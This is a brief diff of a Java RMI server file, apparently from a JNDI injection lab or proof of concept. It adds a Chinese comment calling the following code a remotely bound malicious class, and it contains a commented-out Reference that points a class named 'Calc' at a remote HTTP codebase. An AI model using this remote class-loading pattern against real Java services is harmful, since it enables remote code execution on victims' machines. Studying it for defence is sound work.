@@ -14,6 +14,7 @@ public class RMIServer {
         System.setProperty("java.rmi.server.hostname","39.108.244.167");
         Registry registry = LocateRegistry.createRegistry(1099);
 
+        //RMIServer远程绑定恶意类
         /*
         Reference reference = new Reference("Calc","Calc","http://127.0.0.1:80/");
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
